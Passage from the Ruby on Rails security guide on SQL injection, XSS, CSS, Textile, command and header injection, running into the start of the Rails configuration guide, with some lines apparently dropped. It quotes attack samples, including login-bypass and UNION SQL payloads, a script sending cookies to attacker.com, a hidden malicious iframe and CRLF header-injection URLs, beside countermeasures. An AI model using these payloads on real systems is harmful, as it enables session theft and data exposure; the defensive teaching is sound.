SQL injection attacks aim at influencing database queries by manipulating web application parameters. 
A popular goal of SQL injection attacks is to bypass authorization. 
Another goal is to carry out data manipulation or reading arbitrary data. 
Here is an example of how not to use user input data in a query:
Project.where("name = '#{params[:name]}'")
This could be in a search action and the user may enter a project's name that they want to find. 
If a malicious user enters ' OR 1 --, the resulting SQL query will be:
SELECT * FROM projects WHERE name = '' OR 1 --'
The two dashes start a comment ignoring everything after it. 
So the query returns all records from the projects table including those blind to the user. 
This is because the condition is true for all records.
#### Bypassing Authorization
Usually a web application includes access control. 
The user enters their login credentials and the web application tries to find the matching record in the users table. 
The application grants access when it finds a record. 
However, an attacker may possibly bypass this check with SQL injection. 
The following shows a typical database query in Rails to find the first record in the users table which matches the login credentials parameters supplied by the user.
User.first("login = '#{params[:name]}' AND password = '#{params[:password]}'")
If an attacker enters ' OR '1'='1 as the name, and ' OR '2'>'1 as the password, the resulting SQL query will be:
SELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '2'>'1' LIMIT 1
This will simply find the first record in the database, and grants access to this user.
#### Unauthorized Reading
The UNION statement connects two SQL queries and returns the data in one set. 
An attacker can use it to read arbitrary data from the database. 
Let's take the example from above:
And now let's inject another query using the UNION statement:
') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --
This will result in the following SQL query:
SELECT * FROM projects WHERE (name = '') UNION
  SELECT id,login AS name,password AS description,1,1,1 FROM users --'
The result won't be a list of projects (because there is no project with an empty name), but a list of user names and their password. 
So hopefully you encrypted the passwords in the database! 
The only problem for the attacker is, that the number of columns has to be the same in both queries. 
That's why the second query includes a list of ones (1), which will be always the value 1, in order to match the number of columns in the first query.
Also, the second query renames some columns with the AS statement so that the web application displays the values from the user table. 
Be sure to update your Rails [to at least 2.1.1](http://www.rorsecurity.info/2008/09/08/sql-injection-issue-in-limit-and-offset-parameter/).
#### Countermeasures
Ruby on Rails has a built-in filter for special SQL characters, which will escape ' , " , NULL character and line breaks. 
Instead of passing a string to the conditions option, you can pass an array to sanitize tainted strings like this:
Model.where("login = ? 
AND password = ?", entered_user_name, entered_password).first
As you can see, the first part of the array is an SQL fragment with question marks. 
The sanitized versions of the variables in the second part of the array replace the question marks. 
Or you can pass a hash for the same result:
Model.where(login: entered_user_name, password: entered_password).first
The array or hash form is only available in model instances. 
You can try `sanitize_sql()` elsewhere. 
_Make it a habit to think about the security consequences when using an external string in SQL_.
### Cross-Site Scripting (XSS)
INFO: _The most widespread, and one of the most devastating security vulnerabilities in web applications is XSS. 
This malicious attack injects client-side executable code. 
Rails provides helper methods to fend these attacks off.
#### Entry Points
An entry point is a vulnerable URL and its parameters where an attacker can start an attack.
The most common entry points are message posts, user comments, and guest books, but project titles, document names and search result pages have also been vulnerable - just about everywhere where the user can input data. 
But the input does not necessarily have to come from input boxes on web sites, it can be in any URL parameter - obvious, hidden or internal. 
Remember that the user may intercept any traffic. 
Applications, such as the [Live HTTP Headers Firefox plugin](http://livehttpheaders.mozdev.org/), or client-site proxies make it easy to change requests.
XSS attacks work like this: An attacker injects some code, the web application saves it and displays it on a page, later presented to a victim. 
Most XSS examples simply display an alert box, but it is more powerful than that. 
XSS can steal the cookie, hijack the session, redirect the victim to a fake website, display advertisements for the benefit of the attacker, change elements on the web site to get confidential information or install malicious software through security holes in the web browser.
During the second half of 2007, there were 88 vulnerabilities reported in Mozilla browsers, 22 in Safari, 18 in IE, and 12 in Opera. 
The [Symantec Global Internet Security threat report](http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf) also documented 239 browser plug-in vulnerabilities in the last six months of 2007. 
[Mpack](http://pandalabs.pandasecurity.com/mpack-uncovered/) is a very active and up-to-date attack framework which exploits these vulnerabilities. 
For criminal hackers, it is very attractive to exploit an SQL-Injection vulnerability in a web application framework and insert malicious code in every textual table column. 
In April 2008 more than 510,000 sites were hacked like this, among them the British government, United Nations, and many more high targets.
A relatively new, and unusual, form of entry points are banner advertisements. 
In earlier 2008, malicious code appeared in banner ads on popular sites, such as MySpace and Excite, according to [Trend Micro](http://blog.trendmicro.com/myspace-excite-and-blick-serve-up-malicious-banner-ads/).
#### HTML/JavaScript Injection
The most common XSS language is of course the most popular client-side scripting language JavaScript, often in combination with HTML. _Escaping user input is essential_.
Here is the most straightforward test to check for XSS:
<script>alert('Hello');</script>
This JavaScript code will simply display an alert box. 
The next examples do exactly the same, only in very uncommon places:
<img src=javascript:alert('Hello')>
<table background="javascript:alert('Hello')">
##### Cookie Theft
These examples don't do any harm so far, so let's see how an attacker can steal the user's cookie (and thus hijack the user's session). 
In JavaScript you can use the document.cookie property to read and write the document's cookie. 
JavaScript enforces the same origin policy, that means a script from one domain cannot access cookies of another domain. 
The document.cookie property holds the cookie of the originating web server. 
However, you can read and write this property, if you embed the code directly in the HTML document (as it happens with XSS). 
Inject this anywhere in your web application to see your own cookie on the result page:
<script>document.write(document.cookie);</script>
For an attacker, of course, this is not useful, as the victim will see their own cookie. 
The next example will try to load an image from the URL http://www.attacker.com/ plus the cookie. 
Of course this URL does not exist, so the browser displays nothing. 
But the attacker can review their web server's access log files to see the victim's cookie.
<script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
The log files on www.attacker.com will read like this:
GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
Http only cookies can be used from IE v6.
SP1, Firefox v2.0.0.5 and Opera 9.5. Safari is still considering, it ignores the option. 
But other, older browsers (such as WebTV and IE 5.5 on Mac) can actually cause the page to fail to load. 
##### Defacement
With web page defacement an attacker can do a lot of things, for example, present false information or lure the victim on the attackers web site to steal the cookie, login credentials or other sensitive data. 
The most popular way is to include code from external sources by iframes:
<iframe name="StatPage" src="http://58.xx.xxx.xxx" width=5 height=5 style="display:none"></iframe>
This loads arbitrary HTML and/or JavaScript from an external source and embeds it as part of the site. 
This iframe is taken from an actual attack on legitimate Italian sites using the [Mpack attack framework](http://isc.sans.org/diary.html?storyid=3015). 
Mpack tries to install malicious software through security holes in the web browser - very successfully, 50% of the attacks succeed.
A more specialized attack could overlap the entire web site or display a login form, which looks the same as the site's original, but transmits the user name and password to the attacker's site. 
Or it could use CSS and/or JavaScript to hide a legitimate link in the web application, and display another one at its place which redirects to a fake web site.
Reflected injection attacks are those where the payload is not stored to present it to the victim later on, but included in the URL. Especially search forms fail to escape the search string. 
The following link presented a page which stated that "George Bush appointed a 9 year old boy to be the chairperson...":
http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1-->
  <script src=http://www.securitylab.ru/test/sc.js></script><!--
##### Countermeasures
_It is very important to filter malicious input, but it is also important to escape the output of the web application_.
Especially for XSS, it is important to do _whitelist input filtering instead of blacklist_. 
Whitelist filtering states the values allowed as opposed to the values not allowed. 
Blacklists are never complete.
Imagine a blacklist deletes "script" from the user input. 
Now the attacker injects "&lt;scrscriptipt&gt;", and after the filter, "&lt;script&gt;" remains. 
Earlier versions of Rails used a blacklist approach for the strip_tags(), strip_links() and sanitize() method. 
So this kind of injection was possible:
strip_tags("some<<b>script>alert('hello')<</b>/script>")
This returned "some&lt;script&gt;alert('hello')&lt;/script&gt;", which makes an attack work. 
tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
s = sanitize(user_input, tags: tags, attributes: %w(href title))
This allows only the given tags and does a good job, even against all kinds of tricks and malformed tags.
As a second step, _it is good practice to escape all output of the application_, especially when re-displaying user input, which hasn't been input-filtered (as in the search form example earlier on). 
_Use `escapeHTML()` (or its alias `h()`) method_ to replace the HTML input characters &amp;, &quot;, &lt;, &gt; by their uninterpreted representations in HTML (`&amp;`, `&quot;`, `&lt`;, and `&gt;`). 
SafeErb reminds you to escape strings from external sources.
##### Obfuscation and Encoding Injection
Network traffic is mostly based on the limited Western alphabet, so new character encodings, such as Unicode, emerged, to transmit characters in other languages. 
But, this is also a threat to web applications, as malicious code can be hidden in different encodings that the web browser might be able to process, but the web application might not. 
Here is an attack vector in UTF-8 encoding:
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;
  &#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
This example pops up a message box. 
It will be recognized by the above sanitize() filter, though. 
A great tool to obfuscate and encode strings, and thus "get to know your enemy", is the [Hackvertor](https://hackvertor.co.uk/public). 
Rails' sanitize() method does a good job to fend off encoding attacks.
#### Examples from the Underground
_In order to understand today's attacks on web applications, it's best to take a look at some real-world attack vectors.
The following is an excerpt from the [Js.Yamanner@m](http://www.symantec.com/security_response/writeup.jsp?docid=2006-061211-4111-99&tabid=1) Yahoo! Mail [worm](http://groovin.net/stuff/yammer.txt). 
It appeared on June 11, 2006 and was the first webmail interface worm:
<img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif'
  target=""onload="var http_request = false;    var Email = '';
  var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...
The worms exploits a hole in Yahoo's HTML/JavaScript filter, which usually filters all target and onload attributes from tags (because there can be JavaScript). 
The filter is applied only once, however, so the onload attribute with the worm code stays in place. 
This is a good example why blacklist filters are never complete and why it is hard to allow HTML/JavaScript in a web application.
Another proof-of-concept webmail worm is Nduja, a cross-domain worm for four Italian webmail services. 
Find more details on [Rosario Valotta's paper](http://www.xssed.com/news/37/Nduja_Connection_A_cross_webmail_worm_XWW/). 
Both webmail worms have the goal to harvest email addresses, something a criminal hacker could make money with.
In December 2006, 34,000 actual user names and passwords were stolen in a [MySpace phishing attack](http://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html). 
The idea of the attack was to create a profile page named "login_home_index_html", so the URL looked very convincing. 
Specially-crafted HTML and CSS was used to hide the genuine MySpace content from the page and instead display its own login form.
The MySpace Samy worm will be discussed in the CSS Injection section.
### CSS Injection
INFO: _CSS Injection is actually JavaScript injection, because some browsers (IE, some versions of Safari and others) allow JavaScript in CSS. Think twice about allowing custom CSS in your web application.
CSS Injection is explained best by a well-known worm, the [MySpace Samy worm](http://namb.la/popular/tech.html).
 This worm automatically sent a friend request to Samy (the attacker) simply by visiting his profile. 
Within several hours he had over 1 million friend requests, but it creates too much traffic on MySpace, so that the site goes offline. 
The following is a technical explanation of the worm.
MySpace blocks many tags, however it allows CSS. So the worm's author put JavaScript into CSS like this:
<div style="background:url('javascript:alert(1)')">
So the payload is in the style attribute. 
But there are no quotes allowed in the payload, because single and double quotes have already been used. 
But JavaScript has a handy eval() function which executes any string as code.
<div id="mycode" expr="alert('hah!')" 
style="background:url('javascript:eval(document.all.mycode.expr)')">
The eval() function is a nightmare for blacklist input filters, as it allows the style attribute to hide the word "innerHTML":
alert(eval('document.body.inne' + 'rHTML'));
The next problem was MySpace filtering the word "javascript", so the author used "java&lt;NEWLINE&gt;script" to get around this:
Another problem for the worm's author were CSRF security tokens. 
Without them he couldn't send a friend request over POST. 
He got around it by sending a GET to the page right before adding a user and parsing the result for the CSRF token.
In the end, he got a 4 KB worm, which he injected into his profile page.
The [moz-binding](http://www.securiteam.com/securitynews/5LP051FHPE.html) CSS property proved to be another way to introduce JavaScript in CSS in Gecko-based browsers (Firefox, for example).
This example, again, showed that a blacklist filter is never complete. 
_If you want to allow custom colors or images, you can allow the user to choose them and build the CSS in the web application_. 
Use Rails' `sanitize()` method as a model for a whitelist CSS filter, if you really need one.
### Textile Injection
If you want to provide text formatting other than HTML (due to security), use a mark-up language which is converted to HTML on the server-side. 
[RedCloth](http://redcloth.org/) is such a language for Ruby, but without precautions, it is also vulnerable to XSS.
For example, RedCloth translates `_test_` to &lt;em&gt;test&lt;em&gt;, which makes the text italic. 
However, up to the current version 3.0.4, it is still vulnerable to XSS. 
Get the [all-new version 4](http://www.redcloth.org) that removed serious bugs. 
However, even that version has [some security bugs](http://www.rorsecurity.info/journal/2008/10/13/new-redcloth-security.html), so the countermeasures still apply. 
Here is an example for version 3.0.4:
RedCloth.new('<script>alert(1)</script>').to_html
# => "<script>alert(1)</script>"
Use the :filter_html option to remove HTML which was not created by the Textile processor.
RedCloth.new('<script>alert(1)</script>', [:filter_html]).to_html
# => "alert(1)"
However, this does not filter all HTML, a few tags will be left (by design), for example &lt;a&gt;:
RedCloth.new("<a href='javascript:alert(1)'>hello</a>", [:filter_html]).to_html
# => "<p><a href="javascript:alert(1)">hello</a></p>"
It is recommended to _use RedCloth in combination with a whitelist input filter_, as described in the countermeasures against XSS section.
### Ajax Injection
NOTE: _The same security precautions have to be taken for Ajax actions as for "normal" ones. 
There is at least one exception, however: The output has to be escaped in the controller already, if the action doesn't render a view.
Otherwise, if the return value contains a XSS string, the malicious code will be executed upon return to the browser. 
Escape any input value using the h() method.
### Command Line Injection
NOTE: _Use user-supplied command line parameters with caution.
If your application has to execute commands in the underlying operating system, there are several methods in Ruby: exec(command), syscall(command), system(command) and `command`. 
You will have to be especially careful with these functions if the user may enter the whole command, or a part of it. 
This is because in most shells, you can execute another command at the end of the first one, concatenating them with a semicolon (;) or a vertical bar (|).
A countermeasure is to _use the `system(command, parameters)` method which passes command line parameters safely_.
system("/bin/echo","hello; rm *")
# prints "hello; rm *" and does not delete files
### Header Injection
WARNING: _HTTP headers are dynamically generated and under certain circumstances user input may be injected. 
This can lead to false redirection, XSS or HTTP response splitting.
HTTP request headers have a Referer, User-Agent (client software), and Cookie field, among others. 
Response headers for example have a status code, Cookie and Location (redirection target URL) field. 
All of them are user-supplied and may be manipulated with more or less effort. 
_Remember to escape these header fields, too.
_ For example when you display the user agent in an administration area.
Besides that, it is _important to know what you are doing when building response headers partly based on user input.
_ For example you want to redirect the user back to a specific page. 
To do that you introduced a "referer" field in a form to redirect to the given address:
redirect_to params[:referer]
What happens is that Rails puts the string into the Location header field and sends a 302 (redirect) status to the browser. 
The first thing a malicious user would do, is this:
http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld
And due to a bug in (Ruby and) Rails up to version 2.1.2 (excluding it), a hacker may inject arbitrary header fields; for example like this:
http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld%0d%0aX-Header:+Hi!
http://www.yourapplication.com/controller/action?referer=path/at/your/app%0d%0aLocation:+http://www.malicious.tld
Note that "%0d%0a" is URL-encoded for "\r\n" which is a carriage-return and line-feed (CRLF) in Ruby. 
So the resulting HTTP header for the second example will be the following because the second Location header field overwrites the first.
HTTP/1.1 302 Moved Temporarily
(...)
Location: http://www.malicious.tld
So _attack vectors for Header Injection are based on the injection of CRLF characters in a header field.
_ And what could an attacker do with a false redirection? 
They could redirect to a phishing site that looks the same as yours, but ask to login again (and sends the login credentials to the attacker). 
Or they could install malicious software through browser security holes on that site. 
Rails 2.1.2 escapes these characters for the Location field in the `redirect_to` method. 
_Make sure you do it yourself when you build other header fields with user input.
#### Response Splitting
If Header Injection was possible, Response Splitting might be, too. 
In HTTP, the header block is followed by two CRLFs and the actual data (usually HTML). 
The idea of Response Splitting is to inject two CRLFs into a header field, followed by another response with malicious HTML. 
The response will be:
HTTP/1.1 302 Found [First standard 302 response]
Date: Tue, 12 Apr 2005 22:09:07 GMT
Content-Type: text/html
HTTP/1.1 200 OK [Second New response created by attacker begins]
&lt;html&gt;&lt;font color=red&gt;hey&lt;/font&gt;&lt;/html&gt; [Arbitary malicious input is
Keep-Alive: timeout=15, max=100         shown as the redirected page]
Connection: Keep-Alive
Transfer-Encoding: chunked
Under certain circumstances this would present the malicious HTML to the victim. 
However, this only seems to work with Keep-Alive connections (and many browsers are using one-time connections). 
But you can't rely on this. 
_In any case this is a serious bug, and you should update your Rails to version 2.0.5 or 2.1.2 to eliminate Header Injection (and thus response splitting) risks.
Unsafe Query Generation
-----------------------
Due to the way Active Record interprets parameters in combination with the way<n>that Rack parses query parameters it was possible to issue unexpected database<n>queries with `IS NULL` where clauses. 
As a response to that security issue<n>([CVE-2012-2660](https://groups.google.com/forum/#!searchin/rubyonrails-security/deep_munge/rubyonrails-security/8SA-M3as7A8/Mr9fi9X4kNgJ),<n>[CVE-2012-2694](https://groups.google.com/forum/#!searchin/rubyonrails-security/deep_munge/rubyonrails-security/jILZ34tAHF4/7x0hLH-o0-IJ)<n>and [CVE-2013-0155](https://groups.google.com/forum/#!searchin/rubyonrails-security/CVE-2012-2660/rubyonrails-security/c7jT-EeN9eI/L0u4e87zYGMJ))<n>`deep_munge` method was introduced as a solution to keep Rails secure by default.
Example of vulnerable code that could be used by attacker, if `deep_munge`<n>wasn't performed is:
unless params[:token].nil?
  user = User.find_by_token(params[:token])
  user.reset_password!
When `params[:token]` is one of: `[]`, `[nil]`, `[nil, nil, ...]` or<n>`['foo', nil]` it will bypass the test for `nil`, but `IS NULL` or<n>`IN ('foo', NULL)` where clauses still will be added to the SQL query.
To keep rails secure by default, `deep_munge` replaces some of the values with<n>`nil`. 
Below table shows what the parameters look like based on `JSON` sent in<n>request:
| JSON                              | Parameters               |
|-----------------------------------|--------------------------|
| `{ "person": null }`              | `{ :person => nil }`     |
| `{ "person": [] }`                | `{ :person => nil }`     |
| `{ "person": [null] }`            | `{ :person => nil }`     |
| `{ "person": [null, null, ...] }` | `{ :person => nil }`     |
| `{ "person": ["foo", null] }`     | `{ :person => ["foo"] }` |
It is possible to return to old behaviour and disable `deep_munge` configuring<n>your application if you are aware of the risk and know how to handle it:
config.action_dispatch.perform_deep_munge = false
Default Headers
Every HTTP response from your Rails application receives the following default security headers.
config.action_dispatch.default_headers = {
  'X-Frame-Options' => 'SAMEORIGIN',
  'X-XSS-Protection' => '1; mode=block',
  'X-Content-Type-Options' => 'nosniff'
You can configure default headers in `config/application.rb`.
  'Header-Name' => 'Header-Value',
  'X-Frame-Options' => 'DENY'
Or you can remove them.
config.action_dispatch.default_headers.clear
Here is a list of common headers:
* X-Frame-Options
Set it to 'DENY' to deny framing at all or 'ALLOWALL' if you want to allow framing for all website.
* X-XSS-Protection
Set it to '0;' if you want to switch XSS Auditor off(useful if response contents scripts from request parameters)
* X-Content-Type-Options
_'nosniff' in Rails by default_ - stops the browser from guessing the MIME type of a file.
* X-Content-Security-Policy
[A powerful mechanism for controlling which sites certain content types can be loaded from](http://w3c.github.io/webappsec/specs/content-security-policy/csp-specification.dev.html)
* Access-Control-Allow-Origin
Used to control which sites are allowed to bypass same origin policies and send cross-origin requests.
* Strict-Transport-Security
[Used to control if the browser is allowed to only access a site over a secure connection](http://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security)
Environmental Security
----------------------
It is beyond the scope of this guide to inform you on how to secure your application code and environments. 
However, please secure your database configuration, e.g. `config/database.yml`, and your server-side secret, e.g. stored in `config/secrets.yml`. 
You may want to further restrict access, using environment-specific versions of these files and any others that may contain sensitive information.
--------------------
The security landscape shifts and it is important to keep up to date, because missing a new vulnerability can be catastrophic. 
You can find additional resources about (Rails) security here:
* The Ruby on Rails security project posts security news regularly: [http://www.rorsecurity.info](http://www.rorsecurity.info)
* Subscribe to the Rails security [mailing list](http://groups.google.com/group/rubyonrails-security)
* [Keep up to date on the other application layers](http://secunia.com/) (they have a weekly newsletter, too)
* A [good security blog](http://ha.ckers.org/blog/) including the [Cross-Site scripting Cheat Sheet](http://ha.ckers.org/xss.html)
Configuring Rails Applications
==============================
This guide covers the configuration and initialization features available to Rails applications.
* How to adjust the behavior of your Rails applications.
* How to add additional code to be run at application start time.
Locations for Initialization Code
Rails offers four standard spots to place initialization code:
* `config/application.rb`
* Environment-specific configuration files
* Initializers
* After-initializers
Running Code Before Rails
-------------------------
In the rare event that your application needs to run some code before Rails itself is loaded, put it above the call to `require 'rails/all'` in `config/application.rb`.
Configuring Rails Components
----------------------------
In general, the work of configuring Rails means configuring the components of Rails, as well as configuring Rails itself. 
The configuration file `config/application.rb` and environment-specific configuration files (such as `config/environments/production.rb`) allow you to specify the various settings that you want to pass down to all of the components.
For example, the `config/application.rb` file includes this setting:
config.autoload_paths += %W(#{config.root}/extras)
This is a setting for Rails itself. 
If you want to pass settings to individual Rails components, you can do so via the same `config` object in `config/application.rb`:
config.active_record.schema_format = :ruby
Rails will use that particular setting to configure Active Record.
### Rails General Configuration
These configuration methods are to be called on a `Rails::Railtie` object, such as a subclass of `Rails::Engine` or `Rails::Application`.
* `config.after_initialize` takes a block which will be run _after_ Rails has finished initializing the application. 
That includes the initialization of the framework itself, engines, and all the application's initializers in `config/initializers`. 
Note that this block _will_ be run for rake tasks. 
Useful for configuring values set up by other initializers:
    config.after_initialize do
      ActionView::Base.sanitized_allowed_tags.delete 'div'
* `config.asset_host` sets the host for the assets. 
Shorter version of `config.action_controller.asset_host`.
* `config.autoload_once_paths` accepts an array of paths from which Rails will autoload constants that won't be wiped per request. 
Relevant if `config.cache_classes` is false, which is the case in development mode by default. 
Otherwise, all autoloading happens only once. 
All elements of this array must also be in `autoload_paths`. 
Default is an empty array.
* `config.autoload_paths` accepts an array of paths from which Rails will autoload constants. 
Default is all directories under `app`.
* `config.cache_classes` controls whether or not application classes and modules should be reloaded on each request. 
Defaults to false in development mode, and true in test and production modes.<n><n>
* `config.action_view.cache_template_loading` controls whether or not templates should be reloaded on each request. 
* `config.beginning_of_week` sets the default beginning of week for the<n>application. 
Accepts a valid week day symbol (e.g. `:monday`).
* `config.cache_store` configures which cache store to use for Rails caching. 
Options include one of the symbols `:memory_store`, `:file_store`, `:mem_cache_store`, `:null_store`, or an object that implements the cache API. 
Defaults to `:file_store` if the directory `tmp/cache` exists, and to `:memory_store` otherwise.
* `config.colorize_logging` specifies whether or not to use ANSI color codes when logging information. 
Defaults to true.
* `config.consider_all_requests_local` is a flag. 
If true then any error will cause detailed debugging information to be dumped in the HTTP response, and the `Rails::Info` controller will show the application runtime context in `/rails/info/properties`. 
True by default in development and test environments, and false in production mode. 
For finer-grained control, set this to false and implement `local_request?` in controllers to specify which requests should provide debugging information on errors.
* `config.console` allows you to set class that will be used as console you run `rails console`. 
It's best to run it in `console` block:
    console do
      # this block is called only when running console,
      # so we can safely require pry here
      require "pry"
      config.console = Pry
* `config.dependency_loading` is a flag that allows you to disable constant autoloading setting it to false. 
It only has effect if `config.cache_classes` is true, which it is by default in production mode.<n><n>
This includes your application, engines, Rails frameworks and any other registered namespace.
* `config.eager_load_namespaces` registers namespaces that are eager loaded when `config.eager_load` is true. 
All namespaces in the list must respond to the `eager_load!` method.
* `config.eager_load_paths` accepts an array of paths from which Rails will eager load on boot if cache classes is enabled. 
Defaults to every folder in the `app` directory of the application.
* `config.encoding` sets up the application-wide encoding. 
Defaults to UTF-8.
* `config.exceptions_app` sets the exceptions application invoked by the ShowException middleware when an exception happens. 
Defaults to `ActionDispatch::PublicExceptions.new(Rails.public_path)`.
* `config.file_watcher` the class used to detect file updates in the filesystem when `config.reload_classes_only_on_change` is true. 
Must conform to `ActiveSupport::FileUpdateChecker` API.
* `config.filter_parameters` used for filtering out the parameters that<n>you don't want shown in the logs, such as passwords or credit card<n>numbers. 
New applications filter out passwords by adding the following `config.filter_parameters+=[:password]` in `config/initializers/filter_parameter_logging.rb`.
* `config.force_ssl` forces all requests to be under HTTPS protocol by using `ActionDispatch::SSL` middleware.
* `config.log_formatter` defines the formatter of the Rails logger. 
This option defaults to an instance of `ActiveSupport::Logger::SimpleFormatter` for all modes except production, where it defaults to `Logger::Formatter`.
* `config.log_level` defines the verbosity of the Rails logger. 
* `config.log_tags` accepts a list of methods that the `request` object responds to. 
This makes it easy to tag log lines with debug information like subdomain and request id - both very helpful in debugging multi-user production applications.
* `config.logger` accepts a logger conforming to the interface of Log4r or the default Ruby `Logger` class. 
* `config.middleware` allows you to configure the application's middleware. 
This is covered in depth in the [Configuring Middleware](#configuring-middleware) section below.
* `config.reload_classes_only_on_change` enables or disables reloading of classes only when tracked files change. 
By default tracks everything on autoload paths and is set to true. 
If `config.cache_classes` is true, this option is ignored.
* `secrets.secret_key_base` is used for specifying a key which allows sessions for the application to be verified against a known secure key to prevent tampering. 
Applications get `secrets.secret_key_base` initialized to a random key present in `config/secrets.yml`.
Unlike the default setting set this to true when running (absolutely not recommended!) or testing your app in production mode using WEBrick. 
Otherwise you won't be able use page caching and requests for files that exist regularly under the public directory will anyway hit your Rails app.
* `config.session_store` is usually set up in `config/initializers/session_store.rb` and specifies what class to use to store the session. 
Possible values are `:cookie_store` which is the default, `:mem_cache_store`, and `:disabled`. 
The last one tells Rails not to deal with sessions. 
Custom session stores can also be specified:
    config.session_store :my_custom_store
    This custom store must be defined as `ActionDispatch::Session::MyCustomStore`.
* `config.time_zone` sets the default time zone for the application and enables time zone awareness for Active Record.
### Configuring Assets
* `config.assets.enabled` a flag that controls whether the asset<n>pipeline is enabled. 
It is set to true by default.
Recommended in `config/environments/development.rb` to minimize unexpected behavior when deploying to `production`.
* `config.assets.compress` a flag that enables the compression of compiled assets. 
It is explicitly set to true in `config/environments/production.rb`.
* `config.assets.css_compressor` defines the CSS compressor to use. 
It is set by default by `sass-rails`. 
The unique alternative value at the moment is `:yui`, which uses the `yui-compressor` gem.
* `config.assets.js_compressor` defines the JavaScript compressor to use. 
Possible values are `:closure`, `:uglifier` and `:yui` which require the use of the `closure-compiler`, `uglifier` or `yui-compressor` gems respectively.
* `config.assets.paths` contains the paths which are used to look for assets. 
Appending paths to this configuration option will cause those paths to be used in the search for assets.
* `config.assets.precompile` allows you to specify additional assets (other than `application.css` and `application.js`) which are to be precompiled when `rake assets:precompile` is run.
* `config.assets.prefix` defines the prefix where assets are served from. 
Defaults to `/assets`.
* `config.assets.debug` disables the concatenation and compression of assets. 
Set to `true` by default in `development.rb`.
* `config.assets.cache_store` defines the cache store that Sprockets will use. 
The default is
* `config.assets.version` is an option string that is used in MD5 hash generation. 
This can be changed to force all files to be recompiled.
* `config.assets.compile` is a boolean that can be used to turn on live Sprockets compilation in production.
* `config.assets.logger` accepts a logger conforming to the interface of Log4r or the default Ruby `Logger` class. 
Defaults to the same configured at `config.logger`. 
Setting `config.assets.logger` to false will turn off served assets logging.
### Configuring Generators
Rails allows you to alter what generators are used with the `config.generators` method. 
This method takes a block:
config.generators do |g|
  g.orm :active_record
  g.test_framework :test_unit
The full set of methods that can be used in this block are as follows:
* `assets` allows to create assets on generating a scaffold. 
Defaults to `true`.<n>
* `force_plural` allows pluralized model names. 
Defaults to `false`.
* `helper` defines whether or not to generate helpers. 
* `integration_tool` defines which integration tool to use. 
Defaults to `nil`.
* `javascripts` turns on the hook for JavaScript files in generators. 
Used in Rails for when the `scaffold` generator is run. 
* `javascript_engine` configures the engine to be used (for eg. coffee) when generating assets. 
* `orm` defines which orm to use. 
Defaults to `false` and will use Active Record by default.
* `resource_controller` defines which generator to use for generating a controller when using `rails generate resource`. 
Defaults to `:controller`.
Defaults to `:scaffold_controller`.
* `stylesheets` turns on the hook for stylesheets in generators. 
Used in Rails for when the `scaffold` generator is run, but this hook can be used in other generates as well. 
* `stylesheet_engine` configures the stylesheet engine (for eg. sass) to be used when generating assets. 
Defaults to `:css`.
* `test_framework` defines which test framework to use. 
Defaults to `false` and will use Test::Unit by default.
* `template_engine` defines which template engine to use, such as ERB or Haml. 
Defaults to `:erb`.
### Configuring Middleware
Every Rails application comes with a standard set of middleware which it uses in this order in the development environment:
* `ActionDispatch::SSL` forces every request to be under HTTPS protocol. 
Will be available if `config.force_ssl` is set to `true`. 
Options passed to this can be configured by using `config.ssl_options`.
* `ActionDispatch::Static` is used to serve static assets. 
* `Rack::Lock` wraps the app in mutex so it can only be called by a single thread at a time. 
Only enabled when `config.cache_classes` is `false`.
* `ActiveSupport::Cache::Strategy::LocalCache` serves as a basic memory backed cache. 
This cache is not thread safe and is intended only for serving as a temporary memory cache for a single thread.
* `Rack::Runtime` sets an `X-Runtime` header, containing the time (in seconds) taken to execute the request.
* `Rails::Rack::Logger` notifies the logs that the request has begun. 
After request is complete, flushes all the logs.
* `ActionDispatch::ShowExceptions` rescues any exception returned by the application and renders nice exception pages if the request is local or if `config.consider_all_requests_local` is set to `true`. 
If `config.action_dispatch.show_exceptions` is set to `false`, exceptions will be raised regardless.
* `ActionDispatch::RequestId` makes a unique X-Request-Id header available to the response and enables the `ActionDispatch::Request#uuid` method.
* `ActionDispatch::RemoteIp` checks for IP spoofing attacks and gets valid `client_ip` from request headers. 
Configurable with the `config.action_dispatch.ip_spoofing_check`, and `config.action_dispatch.trusted_proxies` options.
* `Rack::Sendfile` intercepts responses whose body is being served from a file and replaces it with a server specific X-Sendfile header. 
Configurable with `config.action_dispatch.x_sendfile_header`.
* `ActionDispatch::Callbacks` runs the prepare callbacks before serving the request.
* `ActiveRecord::ConnectionAdapters::ConnectionManagement` cleans active connections after each request, unless the `rack.test` key in the request environment is set to `true`.
* `ActiveRecord::QueryCache` caches all SELECT queries generated in a request. 
If any INSERT or UPDATE takes place then the cache is cleaned.
* `ActionDispatch::Cookies` sets cookies for the request.
* `ActionDispatch::Session::CookieStore` is responsible for storing the session in cookies. 
An alternate middleware can be used for this by changing the `config.action_controller.session_store` to an alternate value. 
Additionally, options passed to this can be configured by using `config.action_controller.session_options`.
* `ActionDispatch::Flash` sets up the `flash` keys. 
Only available if `config.action_controller.session_store` is set to a value.
* `ActionDispatch::ParamsParser` parses out parameters from the request into `params`.
* `Rack::MethodOverride` allows the method to be overridden if `params[:_method]` is set. 
This is the middleware which supports the PATCH, PUT, and DELETE HTTP method types.
Besides these usual middleware, you can add your own by using the `config.middleware.use` method:
config.middleware.use Magical::Unicorns
This will put the `Magical::Unicorns` middleware on the end of the stack. 
You can use `insert_before` if you wish to add a middleware before another.
There's also `insert_after` which will insert a middleware after another:
Middlewares can also be completely swapped out and replaced with others:
config.middleware.swap ActionController::Failsafe, Lifo::Failsafe
They can also be removed from the stack completely:
